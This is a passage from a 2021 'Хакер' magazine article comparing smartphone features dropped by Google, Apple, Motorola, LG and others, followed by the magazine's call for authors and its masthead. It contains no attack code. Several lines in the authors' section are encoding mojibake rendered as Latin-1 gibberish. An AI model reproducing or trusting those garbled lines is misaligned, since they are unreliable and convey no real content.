«черных  прямоугольников»  собираются
радовать нас дальше?


GOOGLE PIXEL: ШАГ НАЗАД — ДВА ШАГА НАЗАД
В названии подраздела — никакой опечатки. В пре дыду щих поколениях
устройств линейки  Pixel мы успели привыкнуть к определенному набору
характеристик. Здесь и топовый (хоть и всег да немного устаревший) чипсет
от Qualcomm (вместо него в Pixel 5 установлен процессор среднего уровня),
и какие‐то уникальные для Google мелочи.
  Одной из таких мелочей были чувствительные к сжатию боковины (их
очень удобно было перенас троить на включение фонарика или функцию бло‐
кировки экрана). В новой линейке Pixel 5, состоящей из единственного одно‐
именного смартфо на, на сенсорных бокови нах сэкономили.





                        Это го больше нет

Еще одним интересным решением в Pixel 4 и 4 XL стал радар Solis, который
планировалось… впрочем, ничего полезного Google с этой технологией так
и не сделала, и жалеть о ее отсутс твии в Pixel 5 лично я не стану.
  В Pixel 4 / 4 XL применя лась безопасная раз блокировка экрана через ска‐
нер лица пользователя. Эта технология работа ла наподобие Face ID от Apple
и была уникальной для устройств на Android. Почему уникальной, ведь
подобие Face ID есть у любого китайца с дыр кой в экране? Да просто потому,
что «любые китайцы» скопировали внешнюю сторону явления — «раз бло‐
кировку», но совер шенно забыли о «безопас ной». Китайские сканеры лица
не обманывал фотографией (в редких случаях — анимированным изоб‐
ражением) лишь ленивый. Технология разблокировки по лицу от Google
выделялась безопасностью, сравнимой с безопас ностью Face ID. Впрочем,
теперь это в прошлом: себестоимость  технологии оказалась слишком
высокой, и в Pixel 5 от нее отка зались в пользу дешевого датчика отпе чатков,
расположенного на задней панели смартфо на.





                     И это го нет

Начиная со второго поколения смартфоны Pixel оборудовались выделенным
сопроцессором (нейроядром) для уско рения обработки фотографий, а в Pixel
4 — еще и для реализации разблокировки по лицу. Эти сопроцес соры также
пошли под нож в Pixel 5. Впрочем, жалеть об этом не стоит: производитель‐
ность нейроядра чипсета Snapdragon 765G превышает производительность
сопроцессоров от Google, так что много мы в любом случае не потеряли.





                         Это го тоже нет

В сравнении с Pixel 4 XL в новом поколении устройств от Google резко упало
разрешение экранов и, соответственно, плотность точек. Некоторые поль‐
зователи вновь стали жаловать ся на цветные артефакты Pen Tile — проблема,
о которой, казалось бы, давно забыли с переходом на экраны с повышенным
разрешением.
  Наконец, последней мелочью, исчезнувшей из смартфонов Pixel, стала
функция Ambient EQ, которая была пря мым аналогом функции True Tone
из смартфо нов Apple. Увы, но реализация этой функции также тре бовала
отдельного датчика цветовой температу ры, исклю чение которого из новой
модели позволило еще немного сэконо мить.





                     И это го нет

С учетом все го перечисленного есть ли у Pixel 5 какие‐нибудь преимущества
в сравнении с прошлогодней линейкой? 5G, повышенная частота обновления
экрана (с пониженной по сравнению с предыду щим поколе нием плотностью
точек) и, пожалуй, чуть лучшее время работы от батареи (при существенно
более слабом процессоре).
  Остались ли у Pixel 5 какие‐то уникальные воз можнос ти? Да, но их нем‐
ного. В их число входит пленоптический сенсор и уни кальное приложение
камеры, которое работа ет без шаманс тва с бубном прямо из коробки.
В качестве ОС предлага ется чистый Android с весь ма полез ными довесками
от Google и тре мя гарантированными обновлениями. Многие оценят и воз‐
можность разблокировать загрузчик без потери гарантии. Сюда же входит
и чип безопасности Titan M, который делает смартфоны Pixel (с заблокиро‐
ванным загрузчиком) нес колько более безопасными в сравнении с альтер‐
нативами.


             INFO

                       Что  такое  пленоптическая  камера? Об  этом
                       отлично  написано  в  статье  «Вычислительная
                       фотография» (кстати, статью усиленно рекомен‐
                         дую).





APPLE IPHONE: ОКОНЧАТЕЛЬНЫЙ ОТКАЗ ОТ 3D TOUCH
Смартфоны с Android предлага ют сверхмногопиксельные камеры, экраны
с частотой обновле ния 120 Гц с аккуратными вырезами вмес то массивной
«моноброви» и датчики отпечатков, спрятанные под экран. А что новенького
происходит в мире iPhone?
  В новых iPhone исполь зуется новый процессор! Он дей ствительно быс‐
трый и мощный. А в следующем году будет еще быстрее и мощнее. Правда,
Snapdragon 888 тоже быстрее и мощнее Snapdragon 650, так что уникальной
эту возможность не назовешь при всем желании.
  А еще у новых iPhone новая форма корпуса. Почти как в iPhone 5s / iPhone
SE, только лучше.
  А еще в iPhone окончательно отказались от чувстви тельного к силе
нажатия экрана: эта воз можность, получившая наз вание 3D Touch, впервые
появилась в iPhone 6s в 2015 году и просущес твовала вплоть до сен‐
тября 2019 года — модели iPhone 11 ее не получи ли. Не вернулась она и в
линейке iPhone 12.
  С некоторой натяжкой можно посчитать уникальным решение ceramic
shield. С натяжкой, потому что в некото рых смартфо нах из керамики изготав‐
ливается вся задняя крышка целиком.





Уникальными возможнос тями iPhone остается экосистема iOS (дру гих смар‐
тфонов с поддержкой этой операционной системы просто нет) со всеми ее
плюсами и минусами, а также очень длительная в сравнении с другими про‐
изводителями программная поддержка. Дисплеев с повышенной час тотой
обновления iPhone не получили, но хотя бы с плотностью точек здесь все
еще порядок: минимально допустимые для экра нов OLED 450 dpi здесь
выдерживаются, в отличие от подавляющего боль шинства производите лей
смартфонов с Android, в погоне за увеличенной час тотой обновления экрана
пожертвовав ших качеством неподвижного изоб ражения.
  А вот с безопасностью у iPhone стало как‐то не очень: в моделях вплоть
до iPhone 8 / 8 Plus / iPhone X был обнаружен неис правимый баг в загрузчи ке,
позволяющий взломать устройство через режим обновления прошивки
независимо от версии iOS. И нес мотря на то что в свежих поколе ниях iPhone
от уязвимости в загрузчике избавились, для всех версий iOS вплоть до iOS
14.3 включительно были обна ружены уязвимости, используя которые можно
выпол нить джейлбрейк.


MOTOROLA: КОНЕЦ МОДУЛЕЙ И НЕБЬЮЩИХСЯ ДИСПЛЕЕВ
Неудачное падение — и стеклянный экран, иногда вместе со стеклянным же
корпусом покрывается трещинами. Apple пытается с этим бороться, уве личи‐
вая прочность стекла внедрением в него керами чес ких частиц. А вот Motorola
в свое время пошла другим путем: в модели Moto Z2 Force устанавливался
пластиковый экран, который можно было легко поцарапать, но нельзя раз‐
бить.
  Небьющиеся экраны оста лись в прошлом: в треть ем и четвертом поколе‐
ниях Moto Z от пластиковых экра нов отка зались, а в 2020 году и саму линейку
Moto Z тихо прикрыли.
  С закрытием линейки Z пришел конец и еще одной интереснейшей кон‐
цепции: модулей расширения. К телефону линей ки Z можно приложить смен‐
ную крышку или аксессуар с магнитным креплением (если подумать — пря‐
мой аналог MagSafe, годы спустя реализованный в свежих iPhone  12),
в которые будет встроена какая‐нибудь полезная или декоративная функция.
  Среди таких аксессуаров можно было най ти цифровую камеру с мощ ным
оптическим зумом, внешний аккумулятор, колонки от JBL и колонки с поддер‐
жкой Alexa, наконец — настоящий DLP‐проектор, позволяющий просматри‐
вать видео на стене или ровной поверхнос ти в затемненном помеще нии.





С закрытием линейки больше нет и модулей. А жаль.


LG: ТАКОЙ ЖЕ, НО С КРЫЛЫШКАМИ
В LG любят эксперименты. Изогнутый экран в LG G Flex и Flex 2, неудачная
реализация идеи с модулями в G5 и двойной экран в LG G8x (на самом
деле — всего лишь чехол со вторым экраном) были странными и, скажем чес‐
тно, весьма сом нительными преимуществами. Что мы име ем на сегодняшний
день?
  А сегодня мы име ем возможность нас ладиться очередной реализацией
двойного экрана, на сей раз — в поворот ной форме. Встречаем LG Wing!





В сложенном виде телефон совершенно не отличается от аналогичных
устройств  класса  «черный  пря моугольник». Но  стоит повернуть  экран
на 90 градусов, как телефон превращается… превращается… в странного
Т‐образного кадавра.
  Зачем это нужно? Ну… мож но смотреть ролик на YouTube на горизонталь‐
ном экране и сразу же комментировать его в экране‐«ножке». Ой, прос ти:
Google почему‐то не дорабо тала YouTube, и такой возможности нет. Ну, тог‐
да… тогда можно проигрывать видео в собственном плеере от LG, и при этом
кнопки управления просмотром будут выведены на нижний экран! Ну мегапо‐
лезная же вещь! А еще можно взять телефон за «ножку» и снимать видео, гля‐
дя на горизонтально расположенный основной экран. В принципе, на этом
фантазия маркетологов начина ет буксовать, и пользователю предлагается
самому нащупать сценарии применения. Впрочем, количество предзаказов
на этот смартфон установило своеобразный антирекорд, а восторженных
отзывов в сети особо не наб людается. Наверное, усредненное мне ние
потенциальных покупателей сформулировать так: ес ли LG прекратит выпус‐
кать подобный треш, станет совсем грустно.
  Впрочем, основным лишением смартфонов LG стали… сами смартфоны
LG. Компания уже боль ше года постепенно сворачи вает производс тво
и всерьез рассматривает возможность и вовсе покинуть рынок смартфонов.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
        ПУТЬ ОТКАЗА
                                     КАКИХ ФИЧ
                         МЫ ЛИШИЛИСЬ
                   В СОВРЕМЕННЫХ СМАРТФОНАХ





HUAWEI: ЖИЗНЬ БЕЗ GOOGLE
Huawei забанили в Google. История не нова, накал страс тей остался в прош‐
лом, нам же предлагается свежая линейка смартфонов от Huawei без сер‐
висов Google.
   Если не считать операционной сис темы HarmonyOS, которая «основана
на микроядерной архитектуре реального времени» (на самом же деле пред‐
ставляет собой сырой форк Android 10 с не до кон ца вычищенными копирай‐
тами), то «без сервисов Google» — это и есть та самая фишка, которую пред‐
лагается протестировать пользователям.
  Многие обозреватели, получившие устройства в подарок, рас сказывают,
как хорошо живется без магазина приложений Google Play — ведь у Huawei
есть свой собственный магазин приложений, в котором есть все, что нужно
обычному пользователю! О таких вещах, как Firebase Cloud Messaging, Google
Maps API, синхронизация контактов и, в конце концов, сохранение и восста‐
новление резервных копий при настройке телефона, обозревате ли пред‐
почитают умалчивать, равно как и о том, что на устройствах без сервисов
Google не  будут без модификации  работать приложе ния,  завязанные
на использование этих самых сервисов.
  Впрочем, если ты не планируешь пользовать ся смартфонами других про‐
изводителей, то попробовать можно. В конце концов, устройства без Google
давно и успешно продвигает компания Amazon, разработавшая как собс твен‐
ный форк Android под названием Fire OS, так и собственную замену сервисам
Google в виде Amazon Simple Queue Service API, Amazon Maps API, а также
собственный магазин приложений и собственную службу облачного резер‐
вного копирования. Правда, Amazon никогда не выдавала Fire OS за то, чем
она не является. Напротив, на первой же странице компания высказывается
совершенно однозначно: «Fire OS is a fork of Android».


SAMSUNG И HUAWEI: И СНОВА СКЛАДНЫЕ СМАРТФОНЫ
В 2020 году вышло второе поколение смартфона со складным экраном Sam‐
sung Galaxy Fold 2. Первое поколение Fold было чрезвычай но сырым: в месте
изгиба образовывались складки, экра ны царапались и временами выходили
из строя. Во втором поколении Fold произво дитель исправил многие проб‐
лемы, с которыми  столкнулись пользователи первого.  Технология все
еще сырая, но ломаться так часто и изна шивать ся так быс тро, как в первой
версии, новый раскладной экран не должен.
  Создать складной смартфон попытались и в Huawei. И если Huawei Mate X
(2019) был настолько же неубедителен, как и Samsung Galaxy Fold первого
поколения, то уже в Mate XS разработчики избавились от ряда детских
болячек, а недавно анонсированный Mate X2 и вовсе выглядит весьма инте‐
ресно.





Впрочем, вряд ли это устройство станет популярным: высокая цена и отсутс‐
твие сервисов Google отпугнут заметную часть покупателей за пределами
Китая. Собственно, из‐за это го Huawei и не пла ниру ет продавать устрой ство
на Западе.


SONY: ВЫСОКОЕ РАЗРЕШЕНИЕ, СТАНДАРТНАЯ ЧАСТОТА
ОБНОВЛЕНИЯ
На фоне конкурентов, которые в погоне за повышенной час тотой обновления
экрана резко снизили разрешение, Sony продол жают идти своим путем. Акту‐
альный флагман Xperia 1 mk II по‐прежнему оборуду ется экраном OLED с раз‐
решением 4K.
  Для чего нужно такое высокое раз решение с плотностью пикселей
643 ppi? Если бы Google не прекратила развитие платформы Google Day‐
dream VR, то смартфон стал бы идеальным кандидатом для гарнитуры вир‐
туальной реальности: экран OLED с высочайшей плотностью точек и глубоким
черным цветом выдал бы в очках замет но более качественную картинку, чем
даже Oculus Quest 2 с его матрицей на основе LCD.
  Впрочем, Google Daydream VR убит, как и мно гие дру гие проекты Google.
Из этого следует, что высочайшее раз решение экрана в Xperia 1 mk   II
с разумной точки зрения не просто бесполезно, но и вред но: по слухам, нес‐
мотря на то что экран обла дает воз можностью работы на повышенной час‐
тоте обновления, разработчикам SONY пришлось ограничить частоту зна‐
чением 60 Гц из‐за ограничений платформы Snapdragon 865. Использование
экрана с разрешением QHD вместо 4K поз волило бы пользователям нас‐
ладиться и идеального качес тва ста тическим изображением, и высокой час‐
тотой обновления одновременно. Увы, но погоня за цифровым значением
одного парамет ра, как это часто бывает, при вела к провалу в дру гом.


УСЛОВНО УНИКАЛЬНЫЕ И РАСТИРАЖИРОВАННЫЕ «ФИШКИ»
Часть возможностей, которые еще пару лет назад казались уникальными,
сегодня стала мейнстримом, хотим мы того или нет. А действительно, нужно
ли нам что‐то из того, что сегодня предлага ется в десятках моделей?


Сканер отпечатков под экраном
Подэкранные сканеры отпечатков — далеко не экзотика. Еще два года назад
модели, оборудованные такими датчиками, можно было пересчитать по паль‐
цам; сегодня же им нет числа. Числа нет, но есть ли смысл? Расположенные
под экраном датчики до сих пор обладают рядом недостатков по сравнению
с традиционными, расположенными на задней или боковой поверхности
смартфона. Здесь и вопрос эргономики (вслепую «нащупать» подэкранный
датчик получается не у всех и не всегда), и скорости работы, и надежности
распознавания.
   Тут же и чисто программные ограничения, вынуждающие производителей
встраивать программные костыли (подэкранные дат чики конфликтуют с фун‐
кциями DC Dimming и «ночного» режима экра на). Наконец, не завидую поль‐
зователям отдельных моделей с оптическими ска нера ми: пользователи жалу‐
ются на невозможность раз блокировать экран на ярком солнце; для разбло‐
кировки приходится прятать телефон в карман или и вовсе разблокировать
вводом PIN‐кода.





Тем не менее датчики под экраном вот уже нес колько лет остаются неиз‐
менными. По слухам, как минимум две компании работают над реализацией,
в которой активной зоной датчика становился бы весь экран или нижняя треть
экрана. Такая реализация, если ее внедрят, сни мет вопрос с эргономикой
решения.


Фантазии с камерами и экранами: вырезы против раскладушек
Производителям не дает покоя необходимость «резать» или «прокалывать»
экран для того, чтобы расположить на передней панели смартфона сел‐
фи‐камеру. Чтобы окончательно избавиться от выреза и сде лать экран, пок‐
рывающий как можно большую часть лицевой панели, разработчики идут
на самые разнообразные ухищ рения.
   Так, в модели Xiaomi Mi Mix 3 (2019) была при менена рас кладная конструк‐
ция наподобие слайдера.





В OnePlus 7  Pro для селфи‐камеры использовали выдвижной модуль
с довольно неспешным моторчиком.





                  Источник: обзор www.ixbt.com

В Asus ZenFone 7 Pro использовали поворотный блок камер.





Подобных  конструкций  множество.  Механические  и  моторизованные,
поворотные и выскакива ющие камеры тем не менее не получили массового
распространения среди производителей первого эше лона, да и многие
из тех, кто пытался внедрять такие решения, впос ледствии от них отказались.
Причина — в надежности как самих модулей, так и всего смартфона в целом.
Выдвижные модули усложня ют (а то и вовсе дела ют невозможной) реали‐
зацию защиты от влаги. Попадание в модуль пыли или пес ка у некоторых
пользователей приводило к заклиниванию механиз ма (и хорошо, если в зак‐
рытом положении). Надеж ность раз движного механизма Xiaomi Mi Mix 3 была
подвергнута испытанию, результат которо го оказал ся заметно ниже заяв‐
лений производителя.
  Производители любят не только заиг рывать с механикой, но и потроллить
пользователей цифрами. 48 мегапикселей! 60! 108! С точки зрения поль‐
зователя больше — это всегда лучше. О сущес твовании закона дифракции
пользователи забывают, а ведь именно дифракция не позволяет микроско‐
пическим датчикам запечатлеть более мелкие детали при повышении раз‐
решения. Эффективность технологии  pixel binning для уменьшения циф‐
рового шума также вызывает сомнения.


ПОРТРЕТ СМАРТФОНА 2021 ГОДА
Каким будет типичный смартфон 2021 года, флагманский или около того?
Вариантов несколько.
  Вариант 1: черный пря моугольник с вырезом. Самый популярный нынче
вариант. Частота обновления экрана — порядка 120 Гц (возможны вари анты
с 75, 90 или 144 Гц, а также адаптивной частотой экрана); при этом раз‐
решение и плот ность точек снижены нас только, что некоторые пользовате ли
вновь начинают жаловаться на цветные ореолы (речь о разрешении FHD+
на диагоналях порядка 6,8 дюйма). Обозреватели вспоминают позабытое
слово «пентайл».
  Вариант 2: скучный черный прямоугольник с вырезом. Все то же самое,
только частота обновления экра на оста ется в рамках при вычных 60 Гц. Плот‐
ность точек все равно низкая: зачем старать ся, если у конкурентов такая же?
  Вариант 3: горячий черный пря моугольник с вырезом. А что будет, если
частоту обновле ния сделать 120 Гц, а экранчик уста новить с разрешением
QHD, чтобы никто не кричал «пентайл»? Получится сильный перегрев и жор
батарейки.
  Вариант 4: жужжащий чер ный пря моугольник без выреза. Сюда запишем
все модели с выдвижны ми камерами, а также слайдеры, хоть они и не жужжат.
  Вариант  5:  iPhone,  или сбалансированный  черный  прямоугольник
с вырезом. Здесь хотя бы плот ность точек достаточная, нет перегрева и жуж‐
жащих или выдвигающихся деталей.


ЗАКЛЮЧЕНИЕ
Уникальные фиш ки в смартфонах продолжают отсту пать в угоду оптимизации
стоимости, упрощению производс тва и сни жению цены. Многие из тех
вещей, которыми я с удовольствием пользовал ся в прошлые годы, стали
недоступными в современных устройствах. Здесь и активные грани у Pixel,
и модули у линейки Moto Z, и чувствитель ный к силе нажатия экран iPhone,
и даже причудливо вогнутый дисплей LG G Flex 2 — я радовал ся этим
мелочам, и мне не хватает их в современных устройствах. Какой из черных
прямоугольников ты выберешь в 2021 году: скучный, горячий или жужжащий?
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №03 (264)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный       Евгений Зобнин      Валентин Холмогоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
             Татьяна Чупрова            Марк           Иван «aLLy» Андреев
                chuprova@glc.ru       Бруцкий‐Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2021